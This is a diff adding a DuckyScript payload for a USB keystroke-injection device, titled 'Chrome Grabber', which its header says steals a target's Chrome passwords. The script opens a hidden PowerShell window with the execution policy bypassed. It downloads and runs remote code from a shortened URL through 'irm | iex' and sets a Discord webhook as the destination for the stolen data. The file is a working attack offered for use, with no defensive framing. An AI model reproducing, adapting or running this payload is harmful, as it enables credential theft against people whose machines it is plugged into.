@@ -1,0 +1,15 @@
+REM     Title: Chrome Grabber
+
+REM     Author: wywy123
+
+REM     Description: This payload grabs your target's chrome passwords and sends you the file.
+
+REM     Target: Windows 10, 11
+
+GUI r
+
+DELAY 500
+
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1179276988800843777/iaHJv8WuVIUrg0iu7vztfGElcQ6XrOIS0r4I5or3q1-vvgh_LJrC9VSlypLa0ldb1m7T';$db='';irm https://tinyurl.com/yckyb83b | iex
+
+ENTER
